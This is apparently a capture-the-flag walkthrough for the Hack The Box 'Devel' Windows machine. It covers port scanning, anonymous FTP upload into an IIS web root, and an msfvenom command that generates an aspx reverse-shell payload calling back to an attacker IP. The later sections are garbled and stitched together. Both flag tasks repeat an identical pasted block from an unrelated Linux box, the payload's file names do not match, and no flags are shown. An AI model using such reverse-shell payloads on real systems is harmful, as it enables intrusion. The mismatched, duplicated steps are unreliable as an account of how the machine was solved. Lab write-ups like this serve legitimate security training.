# Devel

<div align="left">

<figure><img src=".gitbook/assets/0fb6455a29eb4f2682f04a780ce26cb1.png" alt="" width="150"><figcaption><p>hackthebox.com - © HACKTHEBOX</p></figcaption></figure>

</div>

🔗 [Devel](https://app.hackthebox.com/machines/Devel)

### Task 1 - Deploy the machine

🎯 Target IP: `10.10.10.5`

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

### Task 2 - Reconnaissance

<pre class="language-bash"><code class="lang-bash">su
echo "10.10.10.5 devel.htb" >> /etc/hosts

mkdir htb/devel.htb
cd htb/devel.htb

# At the end of the room
# To clean up the last line from the /etc/hosts file
<strong>sed -i '$ d' /etc/hosts
</strong></code></pre>

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 devel.htb    
PING devel.htb (10.10.10.5) 56(84) bytes of data.
64 bytes from devel.htb (10.10.10.5): icmp_seq=1 ttl=127 time=57.1 ms
64 bytes from devel.htb (10.10.10.5): icmp_seq=2 ttl=127 time=53.6 ms
64 bytes from devel.htb (10.10.10.5): icmp_seq=3 ttl=127 time=56.2 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~128 secs. this indicates that the target is a Windows system, while \*nix systems usually have a TTL of 64 secs.

### 2.1 - What is the name of the service is running on TCP port `21` on the target machine?

```bash
nmap --open -p0- -n -Pn -vvv --min-rate 5000 devel.htb -oG port_scan
```

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-24 15:32 EDT
Initiating SYN Stealth Scan at 15:32
Scanning devel.htb (10.10.10.5) [65536 ports]
Discovered open port 80/tcp on 10.10.10.5
Discovered open port 21/tcp on 10.10.10.5
Completed SYN Stealth Scan at 15:32, 26.41s elapsed (65536 total ports)
Nmap scan report for devel.htb (10.10.10.5)
Host is up, received user-set (0.057s latency).
Scanned at 2023-07-24 15:32:23 EDT for 26s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 127
80/tcp open  http    syn-ack ttl 127
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sudo</td><td>run as root</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

It looks like there are 2 open ports on the machine: 21, 80.

Now, we need to search which services are running on open ports, in details on port 21:

```bash
nmap -p21,80 -n -Pn -vvv -sCV --min-rate 5000 devel.htb -oN open_ports
```

```bash
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 07-24-23  11:15AM               241062 40564.exe
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 07-24-23  01:26AM                 1442 cmdasp.aspx
| 07-24-23  12:36AM                 2914 devel.aspx
| 07-24-23  01:04AM                 2886 devel1.aspx
| 07-24-23  04:44PM                 2917 devel2.aspx
| 07-24-23  02:11AM                 2749 develshell.aspx
| 07-24-23  11:09AM                15966 fox.aspx
| 07-24-23  09:26AM                 2906 hacked.aspx
| 03-17-17  05:37PM                  689 iisstart.htm
| 07-24-23  07:16PM                    0 killbill.aspx
| 07-24-23  07:21PM                 2912 killbill1.aspx
| 07-24-23  12:17AM                 2783 pwned.aspx
| 07-24-23  03:00PM                 2923 rev.aspx
| 07-24-23  09:21PM                15969 shell.aspx
| 07-24-23  03:34PM                73802 virus.exe
| 07-24-23  12:34AM               112815 virus2.exe
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

{% hint style="info" %}
Microsoft ftpd
{% endhint %}

### 2.2 - Which basic FTP command can be used to upload a single file onto the server?

```bash
ftp devel.htb
Connected to devel.htb.
220 Microsoft FTP Service
Name (devel.htb:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> help
Commands may be abbreviated.  Commands are:

!		cr		ftp		macdef		msend		prompt		restart		sunique
$		debug		gate		mdelete		newer		proxy		rhelp		system
account		delete		get		mdir		nlist		put		rmdir		tenex
append		dir		glob		mget		nmap		pwd		rstatus		throttle
ascii		disconnect	hash		mkdir		ntrans		quit		runique		trace
bell		edit		help		mls		open		quote		send		type
binary		epsv		idle		mlsd		page		rate		sendport	umask
bye		epsv4		image		mlst		passive		rcvbuf		set		unset
case		epsv6		lcd		mode		pdir		recv		site		usage
cd		exit		less		modtime		pls		reget		size		user
cdup		features	lpage		more		pmlsd		remopts		sndbuf		verbose
chmod		fget		lpwd		mput		preserve	rename		status		xferbuf
close		form		ls		mreget		progress	reset		struct		?

```

We can use put command to upload a single file.

{% hint style="info" %}
put
{% endhint %}

### 2.3 - Are files put into the FTP root available via the webserver? 

We can try to put a file using ftp, in this case we use nmap result file (port\_scan):

```bash
ftp> put port_scan 
```

```bash
ftp> put port_scan 
local: port_scan remote: port_scan
229 Entering Extended Passive Mode (|||49219|)
150 Opening ASCII mode data connection.
100% |***************************************************************************************|   464        8.84 MiB/s    --:-- ETA
226 Transfer complete.
464 bytes sent in 00:00 (7.98 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||49220|)
125 Data connection already open; Transfer starting.
07-24-23  11:15AM               241062 40564.exe
03-18-17  02:06AM       <DIR>          aspnet_client
07-24-23  01:26AM                 1442 cmdasp.aspx
07-24-23  12:36AM                 2914 devel.aspx
07-24-23  01:04AM                 2886 devel1.aspx
07-24-23  04:44PM                 2917 devel2.aspx
07-24-23  02:11AM                 2749 develshell.aspx
07-24-23  11:09AM                15966 fox.aspx
07-24-23  09:26AM                 2906 hacked.aspx
03-17-17  05:37PM                  689 iisstart.htm
07-24-23  07:16PM                    0 killbill.aspx
07-24-23  07:21PM                 2912 killbill1.aspx
07-24-23  10:57PM                  464 port_scan
07-24-23  12:17AM                 2783 pwned.aspx
07-24-23  03:00PM                 2923 rev.aspx
07-24-23  09:21PM                15969 shell.aspx
07-24-23  03:34PM                73802 virus.exe
07-24-23  12:34AM               112815 virus2.exe
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```

{% hint style="info" %}
yes
{% endhint %}

### 2.4 - What file extension is executed as a script on this webserver? Don't include the `.`.

```bash
ftp> ls
229 Entering Extended Passive Mode (|||49220|)
125 Data connection already open; Transfer starting.
07-24-23  11:15AM               241062 40564.exe
03-18-17  02:06AM       <DIR>          aspnet_client
07-24-23  01:26AM                 1442 cmdasp.aspx
07-24-23  12:36AM                 2914 devel.aspx
07-24-23  01:04AM                 2886 devel1.aspx
07-24-23  04:44PM                 2917 devel2.aspx
07-24-23  02:11AM                 2749 develshell.aspx
07-24-23  11:09AM                15966 fox.aspx
07-24-23  09:26AM                 2906 hacked.aspx
03-17-17  05:37PM                  689 iisstart.htm
07-24-23  07:16PM                    0 killbill.aspx
07-24-23  07:21PM                 2912 killbill1.aspx
07-24-23  10:57PM                  464 port_scan
07-24-23  12:17AM                 2783 pwned.aspx
07-24-23  03:00PM                 2923 rev.aspx
07-24-23  09:21PM                15969 shell.aspx
07-24-23  03:34PM                73802 virus.exe
07-24-23  12:34AM               112815 virus2.exe
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.

```

{% hint style="info" %}
aspx
{% endhint %}

### 2.5 - Which metasploit reconnaissance module can be used to list possible privilege escalation paths on a compromised system?

We launch msfconsole:

```bash
msfconsole
```

and we search a post/multi/recon exploit:

```bash
search post/multi/recon
```

<figure><img src=".gitbook/assets/Schermata del 2023-07-24 22-30-38.png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
local\_exploit\_suggester
{% endhint %}

### Task 3 - Find user flag

### 3.1 - Submit the flag located on the babis user's desktop.

\
Now, we can use msfvenom to generate an exploit to upload using ftp

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.75 LPORT=444 -f aspx > script.aspx
Payload size: 324 bytes
Final size of aspx file: 2745 bytes
```

```bash
ftp> put exploit.aspx
local: exploit.aspx remote: exploit.aspx
229 Entering Extended Passive Mode (|||49325|)
125 Data connection already open; Transfer starting.
100% |***************************************************************************************|  2783       47.39 MiB/s    --:-- ETA
226 Transfer complete.
2783 bytes sent in 00:00 (48.54 KiB/s)
```













We see that scripts directory has all permessions, jump in!

```bash
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||63113|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         2709 Jul 12 22:43 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```

r we can spawn a bash shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
find / -type f -name 'flag.txt' 2>/dev/null
cat /root/flag.txt
```

<details>

<summary>🚩 Flag 1 (flag.txt)</summary>



</details>



### Task 4 - Find root flag









We see that scripts directory has all permessions, jump in!

```bash
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||63113|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         2709 Jul 12 22:43 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```

r we can spawn a bash shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
find / -type f -name 'flag.txt' 2>/dev/null
cat /root/flag.txt
```

<details>

<summary>🚩 Flag 2 (root.txt)</summary>



</details>
